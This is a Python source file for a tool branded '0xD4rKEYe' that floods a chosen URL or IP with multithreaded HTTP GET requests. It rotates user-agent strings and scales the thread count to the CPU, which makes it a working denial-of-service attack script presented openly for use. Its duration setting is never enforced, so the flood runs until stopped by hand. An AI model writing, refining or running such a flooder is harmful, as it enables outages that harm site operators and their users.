import requests
import threading
import time
import argparse
import random
import pyfiglet
import psutil
from colorama import Fore, Style, init
from datetime import datetime

"""Initialize colorama."""
init(autoreset=True)

class DDoSAttack:
    def __init__(self, target, threads, duration):
        self.target = target
        self.threads = threads
        self.duration = duration
        self.running = True
        self.session = requests.Session()
        self.lock = threading.Lock()
        self.request_count = 0

    def start_attack(self):
        print(Fore.GREEN + f"\n{Style.BRIGHT}Starting HTTP flood attack on {self.target} with {self.threads} threads for {self.duration} seconds.\n")
        start_time = time.time()
        threads = []

        for _ in range(self.threads):
            thread = threading.Thread(target=self.attack)
            threads.append(thread)
            thread.start()

        """Display stats in real-time."""
        stats_thread = threading.Thread(target=self.display_stats, args=(start_time,))
        stats_thread.start()

        """Wait for all threads to finish."""
        for thread in threads:
            thread.join()
        
        self.running = False
        stats_thread.join()  # Ensure stats thread finishes
        print(Fore.RED + "\n" + Style.BRIGHT + "Attack stopped.")

    def attack(self):
        while self.running:
            try:
                headers = {
                    'User-Agent': self.random_user_agent(),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                }
                response = self.session.get(self.target, headers=headers)
                with self.lock:
                    self.request_count += 1
                    print(Fore.YELLOW + f"Flooding {self.target}: {response.status_code} | Total Requests: {self.request_count}", end="\r")
            except requests.exceptions.RequestException as e:
                with self.lock:
                    print(Fore.RED + f"Request failed: {e}")

    def display_stats(self, start_time):
        print(Fore.CYAN + "\n" + Style.BRIGHT + "Statistics: (Press Ctrl+C to stop)\n")
        print(Fore.MAGENTA + f"{'Time':<15}{'Requests':<15}{'RPS':<15}")

        while self.running:
            elapsed_time = time.time() - start_time
            rps = self.request_count / elapsed_time if elapsed_time > 0 else 0

            try:
                """Convert rps to string before formatting."""
                print(Fore.WHITE + f"\n{datetime.now().strftime('%H:%M:%S'):<15}{self.request_count:<15}{'%.2f' % rps:<15}\n", end="\r")
            except Exception as e:
                print(Fore.RED + f"Error displaying stats: {e}")
                break  # Exit the loop if there's an error

            time.sleep(1)

    @staticmethod
    def random_user_agent():
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
            'Mozilla/5.0 (Linux; Android 10; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Mobile Safari/537.36',
            # Add more user agents as needed
        ]
        return random.choice(user_agents)

def calculate_threads():
    """Automatically calculate the number of threads based on CPU cores."""
    cores = psutil.cpu_count(logical=True)
    return max(1, cores * 2)  # Double the core count for threads

def main():
    """Display the tool name using figlet."""
    tool_name = pyfiglet.figlet_format("0xD4rKEYe", font='slant')
    print(Fore.CYAN + tool_name)

    parser = argparse.ArgumentParser(description= Fore.YELLOW + "Beta v1.0" + Fore.RESET + Fore.CYAN)
    parser.add_argument("target", type=str, help="Target URL or IP address")
    parser.add_argument("--threads", "-T", type=int, default=calculate_threads(), help="Number of threads to use (default: auto-calculate)")
    parser.add_argument("--duration", "-D", type=int, default=60, help="Duration of the attack in seconds" + Fore.RESET)

    args = parser.parse_args()

    ddos_attack = DDoSAttack(args.target, args.threads, args.duration)
    ddos_attack.start_attack()

if __name__ == "__main__":
    main()
